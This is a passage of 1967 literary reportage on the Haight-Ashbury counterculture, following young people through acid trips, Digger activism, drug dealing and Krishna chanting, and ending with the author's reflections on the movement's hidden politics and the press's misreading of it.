    &lt;p&gt;“That’s what bugs me about psychedelic art,” Steve says.&lt;/p&gt;
    &lt;p&gt;“What about psychedelic art?” Max says. “I haven’t seen much psychedelic art.”&lt;/p&gt;
    &lt;p&gt;Max is lying on a bed with Sharon, and Steve leans down. “Groove, baby,” he says. “You’re a groove.”&lt;/p&gt;
    &lt;p&gt;Steve sits down then and tells me about one summer when he was at a school of design in Rhode Island and took 30 trips, the last ones all bad. I ask why they were bad. “I could tell you it was my neuroses,” he says, “but forget it.”&lt;/p&gt;
    &lt;p&gt;A few days later I drop by to see Steve in his apartment. He paces nervously around the room he uses as a studio and shows me some paintings. We do not seem to be getting to the point.&lt;/p&gt;
    &lt;p&gt;“Maybe you noticed something going on at Max’s,” he says abruptly.&lt;/p&gt;
    &lt;p&gt;It seems that the girl he brought, the dark, pretty one, had once been Max’s girl. She had followed him to Tangier and now to San Francisco. But Max has Sharon. “So the girl is kind of staying around here,” Steve says.&lt;/p&gt;
    &lt;p&gt;Steve is troubled by a lot of things. He is 23, was raised in Virginia and has the idea that California is the beginning of the end. “I feel it’s insane,” he says, and his voice drops. “This chick tells me there’s no meaning to life, but it doesn’t matter, we’ll just flow right out. There’ve been times I felt like packing up and taking off for the East Coast again. At least there I had a target. At least there you expect that it’s going to happen.” He lights a cigarette for me and his hands shake. “Here you know it’s not going to.”&lt;/p&gt;
    &lt;p&gt;“What is supposed to happen?” I ask.&lt;/p&gt;
    &lt;p&gt;“I don’t know. Something. Anything.”&lt;/p&gt;
    &lt;p&gt;Arthur Lisch is on the telephone in his kitchen, trying to sell VISTA a program for the District. “We’ve already got an emergency,” he is saying into the telephone, meanwhile trying to disentangle his daughter, age one and a half, from the cord. “We don’t get help here, nobody can guarantee what’s going to happen. We’ve got people sleeping in the streets here. We’ve got people starving to death.” He pauses. “All right,” he says then, and his voice rises. “So they’re doing it by choice. So what?”&lt;/p&gt;
    &lt;p&gt;By the time he hangs up he has limned what strikes me as a pretty Dickensian picture of life on the edge of Golden Gate Park, but then this is my first exposure to Arthur Lisch’s “riot-on-the-Street-unless” pitch. Arthur Lisch is a kind of leader of the Diggers, who, in the official District mythology, are supposed to be a group of anonymous good guys with no thought in their collective head but to lend a helping hand. The official District mythology also has it that the Diggers have no “leaders,” but nonetheless Arthur Lisch is one. Arthur Lisch is also a paid worker for the American Friends’ Service Committee, and he lives with his wife, Jane, and their two small children in a railroad flat, which on this particular day lacks organization. For one thing, the telephone keeps ringing. Arthur promises to attend a hearing at city hall. Arthur promises to “send Edward, he’s OK.” Arthur promises to get a good group, maybe the Loading Zone, to play free for a Jewish benefit. For a second thing, the baby is crying, and she does not stop until Jane appears with a jar of Gerber’s Chicken Noodle Dinner. Another confusing element is somebody named Bob, who just sits in the living room and looks at his toes. First he looks at the toes on one foot, then at the toes on the other. I make several attempts to include Bob before I realize he is on a bad trip. Moreover, there are two people hacking up what looks like a side of beef on the kitchen floor, the idea being that when it gets hacked up, Jane Lisch can cook it for the daily Digger feed in the park.&lt;/p&gt;
    &lt;p&gt;Arthur Lisch does not seem to notice any of this. He just keeps talking about cybernated societies and the guaranteed annual wage and riot on the Street, unless.&lt;/p&gt;
    &lt;p&gt;I call the Lisches a day or so later and ask for Arthur. Jane Lisch says he’s next door taking a shower because somebody is coming down from a bad trip in their bathroom. Besides the freak-out in the bathroom, they are expecting a psychiatrist in to look at Bob. Also a doctor for Edward, who is not OK at all but has the flu. Jane says maybe I should talk to Chester Anderson. She will not give me his number.&lt;/p&gt;
    &lt;p&gt;Chester Anderson is a legacy of the Beat Generation, a man in his middle 30s whose peculiar hold on the District derives from his possession of a mimeograph machine, on which he prints communiqués signed “the communication company.” It is another tenet of the official District mythology that the communication company will print anything anybody has to say, but in fact Chester Anderson prints only what he writes himself, agrees with, or considers harmless or dead matter. His statements, which are left in piles and pasted on windows around Haight Street, are regarded with some apprehension in the District and with considerable interest by outsiders, who study them, like China watchers, for subtle shifts in obscure ideologies. An Anderson communiqué might be as specific as fingering someone who is said to have set up a marijuana bust, or it might be in a more general vein:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Pretty little 16-year-old middle-class chick comes to the Haight to see what it’s all about and gets picked up by a 17-year-old street dealer who spends all day shooting her full of speed again and again, then feeds her 3,000 mikes &amp;amp; raffles off her temporarily unemployed body for the biggest Haight Street . . . . since the night before last. The politics and ethics of ecstasy. Rape is as common as . . . . on Haight Street. Kids are starving on the Street. Minds and bodies are being maimed as we watch, a scale model of Vietnam.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Somebody other than Jane Lisch gave me an address for Chester Anderson, 443 Arguello, but 443 Arguello does not exist. I telephone the wife of the man who gave me 443 Arguello and she says it’s 742 Arguello.&lt;/p&gt;
    &lt;p&gt;“But don’t go up there,” she says.&lt;/p&gt;
    &lt;p&gt;I say I’ll telephone.&lt;/p&gt;
    &lt;p&gt;“There’s no number,” she says. “I can’t give it to you.”&lt;/p&gt;
    &lt;p&gt;“742 Arguello,” I say.&lt;/p&gt;
    &lt;p&gt;“No,” she says. “I don’t know. And don’t go there. And don’t use either my name or my husband’s name if you do.”&lt;/p&gt;
    &lt;p&gt;She is the wife of a full professor of English at San Francisco State College. I decide to lie low on the question of Chester Anderson for a while.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Paranoia strikes deep —&lt;/p&gt;&lt;lb/&gt;Into your life it will creep —&lt;lb/&gt;is a song the Buffalo&lt;lb/&gt;Springfield sings.&lt;/quote&gt;
    &lt;p&gt;The appeal of Malakoff Diggins has kind of faded out, but Max says why don’t I come to his place, just be there, the next time he takes acid. Tom will take it too, probably Sharon, maybe Barbara. We can’t do it for six or seven days because Max and Tom are in STP space now. They are not crazy about STP, but it has advantages. “You’ve still got your forebrain.” Tom says. “I could write behind STP, but not behind acid.” This is the first time I have heard that Tom writes.&lt;/p&gt;
    &lt;p&gt;Otto is feeling better because he discovered it wasn’t the cocaine that made him sick. It was the chicken pox, which he caught while baby-sitting for Big Brother and the Holding Company one night when they were playing. I go over to see him and meet Vicki, who sings now and then with a group called the Jook Savages and lives at Otto’s place. Vicki dropped out of Laguna High “because I had mono,” followed the Grateful Dead up to San Francisco one time, and has been here “for a while.” Her mother and father are divorced, and she does not see her father, who works for a network in New York. A few months ago he came out to do a documentary on the District and tried to find her, but couldn’t. Later he wrote her a letter in care of her mother urging her to go back to school. Vicki guesses maybe she will go back sometime, but she doesn’t see much point in it right now.&lt;/p&gt;
    &lt;p&gt;We are eating a little tempura in Japantown, Chet Helms and I, and he is sharing some of his insights with me. Until a couple of years ago Chet Helms never did much besides hitchhiking, but now he runs the Avalon Ballroom and flies over the Pole to check out the London scene and says things like, “Just for the sake of clarity I’d like to categorize the aspects of primitive religion as I see it.” Right now he is talking about Marshall McLuhan and how the printed word is finished, out, over. But then he considers the East Village Other, an “underground” biweekly published in New York. “The EVO is one of the few papers in America whose books are in the black,” he says. “I know that from reading Barron’s.”&lt;/p&gt;
    &lt;p&gt;A new group is supposed to play today in the Panhandle, a section of Golden Gate Park, but they are having trouble with the amplifier and I sit in the sun listening to a couple of little girls, maybe 17 years old. One of them has a lot of makeup and the other wears Levi’s and cowboy boots. The boots do not look like an affectation, they look like she came up off a ranch about two weeks ago. I wonder what she is doing here in the Panhandle, trying to make friends with a city girl who is snubbing her, but I do not wonder long, because she is homely and awkward, and I think of her going all the way through the consolidated union high school out there where she comes from, and nobody ever asking her to go into Reno on Saturday night for a drive-in movie and a beer on the riverbank, so she runs. “I know a thing about dollar bills,” she is saying now. “You get one that says ‘1111’ in one corner and ‘1111’ in another, you take it down to Dallas, Texas, and they’ll give you $15 for it.”&lt;/p&gt;
    &lt;p&gt;“Who will?” the city girl asks.&lt;/p&gt;
    &lt;p&gt;“I don’t know.”&lt;/p&gt;
    &lt;p&gt;“There are only three significant pieces of data in the world today,” is another thing Chet Helms told me one night. We were at the Avalon and the big strobe was going and so were the colored lights and the Day-Glo painting, and the place was full of high-school kids trying to look turned on. The Avalon sound system projects 126 decibels at 100 feet but to Chet Helms the sound is just there, like the air, and he talks through it. “The first is,” he said, “God died last year and was obited by the press. The second is, 50 percent of the population is or will be under 25.” A boy shook a tambourine toward us and Chet smiled benevolently at him. “The third,” he said, “is that they got 20 billion irresponsible dollars to spend.”&lt;/p&gt;
    &lt;p&gt;Thursday comes, some Thursday, and Max and Tom and Sharon and maybe Barbara are going to take some acid. They want to drop it about three o’clock. Barbara has baked fresh bread, Max has gone to the Park for fresh flowers, and Sharon is busy making a sign for the door which reads, DO NOT DISTURB, RING, KNOCK, OR IN ANY OTHER WAY DISTURB. LOVE. This is not how I would put it to either the health inspector, who is due this week, or any of the several score of narcotics agents in the neighborhood, but I figure the sign is Sharon’s trip.&lt;/p&gt;
    &lt;p&gt;Once the sign is finished Sharon gets restless. “Can I at least play the new record?” she asks Max.&lt;/p&gt;
    &lt;p&gt;“Tom and Barbara want to save it for when we’re high.”&lt;/p&gt;
    &lt;p&gt;“I’m getting bored, just sitting around here.”&lt;/p&gt;
    &lt;p&gt;Max watches her jump up and walk out. “That’s what you call pre-acid uptight jitters,” he says.&lt;/p&gt;
    &lt;p&gt;Barbara is not in evidence. Tom keeps walking in and out. “All these innumerable last-minute things you have to do,” he mutters.&lt;/p&gt;
    &lt;p&gt;“It’s a tricky thing, acid,” Max says after a while. He is turning the stereo on and off. “When a chick takes acid, it’s all right if she’s alone, but when she’s living with somebody this edginess comes out. And if the hour-and-a-half process before you take the acid doesn’t go smooth. . . .” He picks up a marijuana butt and studies it, then adds, “They’re having a little thing back there with Barbara.”&lt;/p&gt;
    &lt;p&gt;Sharon and Tom walk in.&lt;/p&gt;
    &lt;p&gt;“You bugged too?” Max asks Sharon.&lt;/p&gt;
    &lt;p&gt;Sharon does not answer.&lt;/p&gt;
    &lt;p&gt;Max turns to Tom. “Is she all right?”&lt;/p&gt;
    &lt;p&gt;“Yeh.”&lt;/p&gt;
    &lt;p&gt;“Can we take acid?” Max is on edge.&lt;/p&gt;
    &lt;p&gt;“I just don’t know what she’s going to do.”&lt;/p&gt;
    &lt;p&gt;“What do you want to do?”&lt;/p&gt;
    &lt;p&gt;“What I want to do depends on what she wants to do.” Tom is rolling some joints, first rubbing the papers with a marijuana resin he makes himself. He takes the joints back to the bedroom, and Sharon goes with him.&lt;/p&gt;
    &lt;p&gt;“Something like this happens every time people take acid,” Max says. After a while he brightens and develops a theory around it. “Some people don’t like to go out of themselves, that’s the trouble. You probably wouldn’t. You’d probably like only a quarter of a tab. There’s still an ego on a quarter tab, and it wants things. Now if that thing is sex— and your old lady or your old man is off somewhere flashing and doesn’t want to be touched — well, you get put down on acid, you can be on a bummer for months.”&lt;/p&gt;
    &lt;p&gt;Sharon drifts in, smiling. “Barbara might take some acid, we’re all feeling better, we smoked a joint.”&lt;/p&gt;
    &lt;p&gt;At 3:30 that afternoon Max, Tom, and Sharon placed tabs under their tongues and sat down together in the living room to wait for the flash. Barbara stayed in the bedroom, smoking hash. During the next four hours a window banged once in Barbara’s room, and about 5:30 some children had a fight on the street. A curtain billowed in the afternoon wind. A cat scratched a beagle in Sharon’s lap. Except for the sitar music on the stereo there was no other sound or movement until 7:30, when Max said, “Wow.”&lt;/p&gt;
    &lt;p&gt;I spot Deadeye on Haight Street, and he gets in the car. Until we get off the Street he sits very low and inconspicuous. Deadeye wants me to meet his old lady, but first he wants to talk to me about how he got hip to helping people.&lt;/p&gt;
    &lt;p&gt;“Here I was, just a tough kid on a motorcycle,” he says, “and suddenly I see that young people don’t have to walk alone.” Deadeye has a clear evangelistic gaze and the reasonable rhetoric of a car salesman. He is society’s model product. I try to meet his gaze directly because he once told me he could read character in people’s eyes, particularly if he has just dropped acid, which he did about nine o’clock that morning. “They just have to remember one thing,” he says. “The Lord’s Prayer. And that can help them in more ways than one.”&lt;/p&gt;
    &lt;p&gt;He takes a much-folded letter from his wallet. The letter is from a little girl he helped. “My loving brother,” it begins. “I thought I’d write you a letter since I’m a part of you. Remember that: When you feel happiness, I do, when you feel . . .”&lt;/p&gt;
    &lt;p&gt;“What I want to do now,” Deadeye says, “is set up a house where a person of any age can come, spend a few days, talk over his problems. Any age. People your age, they’ve got problems too.”&lt;/p&gt;
    &lt;p&gt;I say a house will take money.&lt;/p&gt;
    &lt;p&gt;“I’ve found a way to make money,” Deadeye says. He hesitates only a few seconds. “I could’ve made $85 on the Street just then. See, in my pocket I had a hundred tabs of acid. I had to come up with $20 by tonight or we’re out of the house we’re in, so I knew somebody who had acid, and I knew somebody who wanted it, so I made the connection.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;“Since the Mafia moved into the LSD racket, the quantity is up and the quality is down. . . .&lt;/p&gt;&lt;lb/&gt;“Historian Arnold Toynbee celebrated his 78th birthday Friday night by snapping his fingers and tapping his toes to the Quicksilver Messenger Service . . .”&lt;/quote&gt;
    &lt;p&gt;are a couple of items from Herb Caen’s column one morning as the West declined in the year 1967.&lt;/p&gt;
    &lt;p&gt;When I was in San Francisco a tab, or a cap, of LSD-25 sold for three to five dollars, depending upon the seller and the district. LSD was slightly cheaper in the Haight-Ashbury than in the Fillmore, where it was used rarely, mainly as a sexual ploy, and sold by pushers of hard drugs, e.g., heroin, or “smack.” A great deal of acid was being cut with Methedrine, which is the trade name for an amphetamine, because Methedrine can simulate the flash that low-quality acid lacks. Nobody knows how much LSD is actually in a tab, but the standard trip is supposed to be 250 micrograms. Grass was running $10 a lid, $5 a matchbox. Hash was considered “a luxury item.” All the amphetamines, or “speed” — Benzedrine, Dexedrine, and particularly Methedrine (“crystal”) — were in common use. There was not only more tolerance of speed but there was a general agreement that heroin was now on the scene. Some attributed this to the presence of the Syndicate; others to a general deterioration of the scene, to the incursions of gangs and younger part-time, or “plastic,” hippies, who like the amphetamines and the illusions of action and power they give. Where Methedrine is in wide use, heroin tends to be available, because, I was told, “You can get awful damn high shooting crystal, and smack can be used to bring you down.”&lt;/p&gt;
    &lt;p&gt;Deadeye’s old lady, Gerry, meets us at the door of their place. She is a big, hearty girl who has always counseled at Girl Scout camps during summer vacations and was “in social welfare” at the University of Washington when she decided that she “just hadn’t done enough living” and came to San Francisco. “Actually, the heat was bad in Seattle,” she adds.&lt;/p&gt;
    &lt;p&gt;“The first night I got down here,” she says, “I stayed with a gal I met over at the Blue Unicorn. I looked like I’d just arrived, had a knapsack and stuff.” After that Gerry stayed at a house the Diggers were running, where she met Deadeye. “Then it took time to get my bearings, so I haven’t done much work yet.”&lt;/p&gt;
    &lt;p&gt;I ask Gerry what work she does. “Basically I’m a poet, but I had my guitar stolen right after I arrived, and that kind of hung up my thing.”&lt;/p&gt;
    &lt;p&gt;“Get your books,” Deadeye orders. “Show her your books.”&lt;/p&gt;
    &lt;p&gt;Gerry demurs, then goes into the bedroom and comes back with several theme books full of verse. I leaf through them but Deadeye is still talking about helping people. “Any kid that’s on speed,” he says, “I’ll try to get him off it. The only advantage to it from the kids’ point of view is that you don’t have to worry about sleeping or eating.”&lt;/p&gt;
    &lt;p&gt;“Or sex,” Gerry adds.&lt;/p&gt;
    &lt;p&gt;“That’s right. When you’re strung out on crystal you don’t need nothing.”&lt;/p&gt;
    &lt;p&gt;“It can lead to the hard stuff,” Gerry says. “Take your average Meth freak, once he’s started putting the needle in his arm, it’s not too hard to say, well, let’s shoot a little smack.”&lt;/p&gt;
    &lt;p&gt;All the while I am looking at Gerry’s poems. They are a very young girl’s poems, each written out in a neat hand and finished off with a curlicue. Dawns are roseate, skies silver-tinted. When she writes “crystal” in her books, she does not mean Meth.&lt;/p&gt;
    &lt;p&gt;“You gotta get back to your writing,” Deadeye says fondly, but Gerry ignores this. She is telling about somebody who propositioned her yesterday. “He just walked up to me on the Street, offered me $600 to go to Reno and do the thing.”&lt;/p&gt;
    &lt;p&gt;“You’re not the only one he approached,” Deadeye says.&lt;/p&gt;
    &lt;p&gt;“If some chick wants to go with him, fine,” Gerry says. “Just don’t bum my trip.” She empties the tuna-fish can we are using for an ashtray and goes over to look at a girl who is asleep on the floor. It is the same girl who was asleep on the floor the first day I came to Deadeye’s place. She has been sick a week now, 10 days. “Usually when somebody comes up to me on the Street like that,” Gerry adds, “I hit him for some change.”&lt;/p&gt;
    &lt;p&gt;When I saw Gerry in the Park the next day I asked her about the sick girl, and Gerry said cheerfully that she was in the hospital with pneumonia.&lt;/p&gt;
    &lt;p&gt;Max tells me about how he and Sharon got together. “When I saw her the first time on Haight Street, I flashed. I mean flashed. So I started some conversation with her about her beads, see, but I didn’t care about her beads.” Sharon lived in a house where a friend of Max’s lived, and the next time he saw her was when he took the friend some bananas. “Sharon and I were like kids — we smoked bananas and looked at each other and smoked more bananas and looked at each other.”&lt;/p&gt;
    &lt;p&gt;But Max hesitated. For one thing, he thought Sharon was his friend’s girl. “For another I didn’t know if I wanted to get hung up with an old lady.” But the next time he visited the house, Sharon was on acid.&lt;/p&gt;
    &lt;p&gt;“So everybody yelled, ‘Here comes the banana man,’” Sharon interrupts, “and I got all excited.”&lt;/p&gt;
    &lt;p&gt;“She was living in this crazy house,” Max continues. “There was this one kid, all he did was scream. His whole trip was to practice screams. It was too much.” Max still hung back from Sharon. “But then Sharon offered me a tab, and I knew.”&lt;/p&gt;
    &lt;p&gt;Max walked to the kitchen and back with the tab, wondering whether to take it. “And then I decided to flow with it, and that was that. Because once you drop acid with somebody, you flash on, you see the whole world melt in her eyes.”&lt;/p&gt;
    &lt;p&gt;“It’s stronger than anything in the world,” Sharon says.&lt;/p&gt;
    &lt;p&gt;“Nothing can break it up,” Max says. “As long as it lasts.”&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;No milk today —&lt;/p&gt;&lt;lb/&gt;My love has gone away . . .&lt;lb/&gt;The end of my hopes —&lt;lb/&gt;The end of all my dreams —&lt;/quote&gt;
    &lt;p&gt;is a song I heard on many mornings in 1967 on KFRC, the Flower Power Station, San Francisco.&lt;/p&gt;
    &lt;p&gt;Deadeye and Gerry tell me that they plan to be married. An Episcopal priest in the District has promised to perform the wedding in Golden Gate Park, and they will have a few rock groups there, “a real community thing.” Gerry’s brother is also getting married, in Seattle. “Kind of interesting,” Gerry muses, “because, you know, his is the traditional straight wedding, and then you have the contrast with ours.”&lt;/p&gt;
    &lt;p&gt;“I’ll have to wear a tie to his,” Deadeye says.&lt;/p&gt;
    &lt;p&gt;“Right,” Gerry says.&lt;/p&gt;
    &lt;p&gt;“Her parents came down to meet me, but they weren’t ready for me,” Deadeye notes philosophically.&lt;/p&gt;
    &lt;p&gt;“They finally gave it their blessing,” Gerry says. “In a way.”&lt;/p&gt;
    &lt;p&gt;“They came to me and her father said, ‘Take care of her,’ “Deadeye reminisces. “And her mother said, ‘Don’t let her go to jail.’”&lt;/p&gt;
    &lt;p&gt;Barbara has baked a macrobiotic apple pie — one made without sweets and with whole-wheat flour — and she and Tom and Max and Sharon and I are eating it. Barbara tells me how she learned to find happiness in “the woman’s thing.” She and Tom had gone somewhere to live with the Indians, and although she first found it hard to be shunted off with the women and never to enter into any of the men’s talk, she soon got the point. “That was where the trip was,” she says.&lt;/p&gt;
    &lt;p&gt;Barbara is on what is called the woman’s trip to the exclusion of almost everything else. When she and Tom and Max and Sharon need money, Barbara will take a part-time job, modeling or teaching kindergarten, but she dislikes earning more than $10 or $20 a week. Most of the time she keeps house and bakes. “Doing something that shows your love that way,” she says, “is just about the most beautiful thing I know.” Whenever I hear about the woman’s trip, which is often, I think a lot about nothin’-says-lovin’-like-something-from-the-oven and the Feminine Mystique and how it is possible for people to be the unconscious instruments of values they would strenuously reject on a conscious level, but I do not mention this to Barbara.&lt;/p&gt;
    &lt;p&gt;It is a pretty nice day and I am just driving down the Street and I see Barbara at a light.&lt;/p&gt;
    &lt;p&gt;What am I doing, she wants to know.&lt;/p&gt;
    &lt;p&gt;I am just driving around.&lt;/p&gt;
    &lt;p&gt;“Groovy,” she says.&lt;/p&gt;
    &lt;p&gt;This is quite a beautiful day, I say.&lt;/p&gt;
    &lt;p&gt;“Groovy,” she agrees.&lt;/p&gt;
    &lt;p&gt;She wants to know if I will come over. Sometime soon, I say.&lt;/p&gt;
    &lt;p&gt;“Groovy,” she says.&lt;/p&gt;
    &lt;p&gt;I ask if she wants to drive in the Park but she is too busy. She is out to buy wool for her loom.&lt;/p&gt;
    &lt;p&gt;Arthur Lisch gets pretty nervous whenever he sees me now because the Digger line this week is that they aren’t talking to “media poisoners,” which is me. So I still don’t have a tap on Chester Anderson, but one day in the Panhandle I run into a kid who says he is Chester’s “associate.” He has on a black cape, black slouch hat, mauve Job’s Daughters’ sweatshirt and dark glasses, and he says his name is Claude Hayward, but never mind that because I think of him just as The Connection. The Connection offers to “check me out.”&lt;/p&gt;
    &lt;p&gt;I take off my dark glasses so he can see my eyes. He leaves his on.&lt;/p&gt;
    &lt;p&gt;“How much you get paid for doing this kind of media poisoning?” he says for openers.&lt;/p&gt;
    &lt;p&gt;I put my dark glasses back on.&lt;/p&gt;
    &lt;p&gt;“There’s only one way to find out where it’s at,” The Connection says, and jerks his thumb at the photographer I’m with. “Dump him and get out on the Street. Don’t take money. You won’t need money.” He reaches into his cape and pulls out a mimeographed sheet announcing a series of classes at the Digger Free Store on How to Avoid Getting Busted, VD, Rape, Pregnancy, Beatings and Starvation. “You oughta come,” The Connection says. “You’ll need it.”&lt;/p&gt;
    &lt;p&gt;I say maybe, but meanwhile I would like to talk to Chester Anderson.&lt;/p&gt;
    &lt;p&gt;“If we decide to get in touch with you at all,” The Connection says, “we’ll get in touch with you real quick.” He kept an eye on me in the Park after that, but he never did call the number I gave him.&lt;/p&gt;
    &lt;p&gt;It is twilight and cold and too early to find Deadeye at the Blue Unicorn so I ring Max’s bell. Barbara comes to the door.&lt;/p&gt;
    &lt;p&gt;“Max and Tom are seeing somebody on a kind of business thing,” she says. “Can you come back a little later?” I am hard put to think what Max and Tom might be seeing somebody about in the way of business, but a few days later in the Park I find out.&lt;/p&gt;
    &lt;p&gt;“Hey,” Tom calls. “Sorry you couldn’t come up the other day, but business was being done.” This time I get the point. “We got some great stuff,” he adds, and begins to elaborate. Every third person in the Park this afternoon looks like a narcotics agent and I try to change the subject. Later I suggest to Max that he be more wary in public. “Listen, I’m very cautious,” he says. “You can’t be too careful.”&lt;/p&gt;
    &lt;p&gt;By now I have an unofficial taboo contact with the San Francisco Police Department. What happens is that this cop and I meet in various late-movie ways, like I happen to be sitting in the bleachers at a baseball game and he happens to sit down next to me, and we exchange guarded generalities. No information actually passes between us, but after a while we get to kind of like each other.&lt;/p&gt;
    &lt;p&gt;“The kids aren’t too bright,” he is telling me on this particular day. “They’ll tell you they can always spot an undercover, they’ll tell you about ‘the kind of car he drives.’ They aren’t talking about undercovers, they’re talking about plainclothesmen who just happen to drive unmarked cars, like I do. They can’t tell an undercover. An undercover doesn’t drive some black Ford with a two-way radio.”&lt;/p&gt;
    &lt;p&gt;He tells me about an undercover who was taken out of the District because he was believed to be over-exposed, too familiar. He was transferred to the narcotics squad, and by error was immediately sent back into the District as a narcotics undercover.&lt;/p&gt;
    &lt;p&gt;The cop plays with his keys. “You want to know how smart these kids are?” he says finally. “The first week, this guy makes 43 cases.”&lt;/p&gt;
    &lt;p&gt;Some kid with braces on his teeth is playing his guitar and boasting that he got the last of the STP from Mr. X himself, and someone else is talking about some acid that will be available within the next month, and you can see that nothing much is happening around the San Francisco Oracle office this afternoon. A boy sits at a drawing board drawing the infinitesimal figures that people do on speed, and the kid with the braces watches him. “I’m gonna shoot my wo–man,” he sings softly. “She been with a–noth–er man.” Someone works out the numerology of my name and the name of the photographer I’m with. The photographer’s is all white and the sea (“If I were to make you some beads, see, I’d do it mainly in white,” he is told), but mine has a double death symbol. The afternoon does not seem to be getting anywhere, so it’s suggested we get in touch with a man named Sandy. We are told he will take us to the Zen temple.&lt;/p&gt;
    &lt;p&gt;Four boys and one middle-aged man are sitting on a grass mat at Sandy’s place, sipping anise tea and listening to Sandy read Laura Huxley’s You Are Not the Target.&lt;/p&gt;
    &lt;p&gt;We sit down and have some anise tea. “Meditation turns us on,” Sandy says. He has a shaved head and the kind of cherubic face usually seen in newspaper photographs of mass murderers. The middle-aged man, whose name is George, is making me uneasy because he is in a trance next to me and he stares at me without seeing me.&lt;/p&gt;
    &lt;p&gt;I feel that my mind is going — George is dead, or we all are — when the telephone suddenly rings.&lt;/p&gt;
    &lt;p&gt;“It’s for George,” Sandy says.&lt;/p&gt;
    &lt;p&gt;“George, telephone.”&lt;/p&gt;
    &lt;p&gt;“George.”&lt;/p&gt;
    &lt;p&gt;Somebody waves his hand in front of George and George finally gets up, bows, and moves toward the door on the balls of his feet.&lt;/p&gt;
    &lt;p&gt;“I think I’ll take George’s tea,” somebody says. “George — are you coming back?”&lt;/p&gt;
    &lt;p&gt;George stops at the door and stares at each of us in turn. “In a moment,” he snaps.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Do you know who is the first eternal spaceman of this universe?&lt;/p&gt;&lt;lb/&gt;The first to send his wild wild vibrations&lt;lb/&gt;To all those cosmic superstations?&lt;lb/&gt;For the song he always shouts&lt;lb/&gt;Sends the planets flipping out . . .&lt;lb/&gt;But I’ll tell you before you think me loony&lt;lb/&gt;That I’m talking about Narada Muni . . .&lt;lb/&gt;Singing&lt;lb/&gt;HARE KRISHNA HARE KRISHNA&lt;lb/&gt;KRISHNA KRISHNA HARE HARE&lt;lb/&gt;HARE RAMA HARE RAMA&lt;lb/&gt;RAMA RAMA HARE HARE&lt;/quote&gt;
    &lt;p&gt;is a Krishna song. Words by Howard Wheeler and music by Michael Grant.&lt;/p&gt;
    &lt;p&gt;Maybe the trip is not in Zen but in Krishna, so I visit Michael Grant, the Swami A. C. Bhaktivedanta’s leading disciple in San Francisco. Grant is at home with his brother-in-law and his wife, a pretty girl wearing a cashmere pullover, a jumper and a red caste mark on her forehead.&lt;/p&gt;
    &lt;p&gt;“I’ve been associated with the Swami since about last July,” Michael says. “See, the Swami came here from India, and he was at this ashram (hermitage) in upstate New York and he just kept to himself and chanted a lot. For a couple of months, pretty soon I helped him get his storefront in New York. Now it’s an international movement, which we spread by teaching this chant.” Michael is fingering his red wooden beads, and I notice that I am the only person in the room who is wearing shoes. “It’s catching on like wildfire.”&lt;/p&gt;
    &lt;p&gt;“If everybody chanted,” the brother-in-law says, “there wouldn’t be any problem with the police or anybody.”&lt;/p&gt;
    &lt;p&gt;“Ginsberg calls the chant ecstasy, but the Swami says that’s not exactly it.” Michael walks across the room and straightens a picture of Krishna as a baby. “Too bad you can’t meet the Swami,” he adds. “The Swami’s in New York now.”&lt;/p&gt;
    &lt;p&gt;“Ecstasy’s not the right word at all,” says the brother-in-law, who has been thinking about it. “It makes you think of some mundane ecstasy.”&lt;/p&gt;
    &lt;p&gt;The next day I drop by Max and Sharon’s, and find them in bed smoking a little morning hash. Sharon once advised me that even half a joint of grass would make getting up in the morning a beautiful thing. I ask Max how Krishna strikes him.&lt;/p&gt;
    &lt;p&gt;“You can get a high on a mantra,” he says. “But I’m holy on acid.”&lt;/p&gt;
    &lt;p&gt;Max passes the joint to Sharon and leans back. “Too bad you couldn’t meet the Swami,” he says. “The Swami was the turn-on.”&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;“Anybody who thinks this is all about drugs has his head in a bag. It’s a social movement, quintessentially romantic, the kind that recurs in times of real social crisis. The themes are always the same. A return to innocence. The invocation of an earlier authority and control. The mysteries of the blood. An itch for the transcendental, for purification. Right there you’ve got the ways that romanticism historically ends up in trouble, lends itself to authoritarianism. When the direction appears. How long do you think it’ll take for that to happen?”&lt;/p&gt;
      &lt;p&gt;is a question a San Francisco psychiatrist asked me.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;At the time, I was in San Francisco, the political potential of the movement was just becoming clear. It had always been clear to the revolutionary core of the Diggers, whose guerrilla talent was now bent on open confrontations and the creation of a summer emergency, and it was clear to many of the doctors and priests and sociologists who had occasion to work in the District, and it could rapidly become clear to any outsider who bothered to decode Chester Anderson’s call-to-action communiqués or to watch who was there first at the street skirmishes which now set the tone for life in the District. One did not have to be a political analyst to see it: The boys in the rock groups saw it, because they were often where it was happening. “In the Park there are always twenty or thirty people below the stand,” one of the Grateful Dead complained to me, “ready to take the crowd on some militant trip.”&lt;/p&gt;
    &lt;p&gt;But the peculiar beauty of this political potential, as far as the activists were concerned, was that it remained not clear at all to most of the inhabitants of the District. Nor was it clear to the press, which at varying levels of competence continued to report “the hippie phenomenon” as an extended panty raid; an artistic avant-garde led by such comfortable YMHA regulars as Allen Ginsberg; or a thoughtful protest, not unlike joining the Peace Corps.&lt;/p&gt;
    &lt;p&gt;This last, or they’re-trying-to-tell-us-something approach, reached its apogee in July in a Time cover story which revealed that hippies “scorn money — they call it ‘bread,’” and remains the most remarkable, if unwitting, extant evidence that the signals between the generations are irrevocably jammed.&lt;/p&gt;
    &lt;p&gt;Because the signals the press was getting were immaculate of political possibilities, the tensions of the District went unremarked upon, even during the period when there were so many observers on Haight Street from Life and Look and CBS that they were largely observing one another. The observers believed roughly what the children told them: That they were a generation dropped out of political action, beyond power games, that the New Left was on an ego trip. Ergo, there really were no activists in the Haight-Ashbury, and those things which happened every Sunday were spontaneous demonstrations because, just as the Diggers say, the police are brutal and juveniles have no rights and runaways are deprived of their right to self-determination, and people are starving to death on Haight Street.&lt;/p&gt;
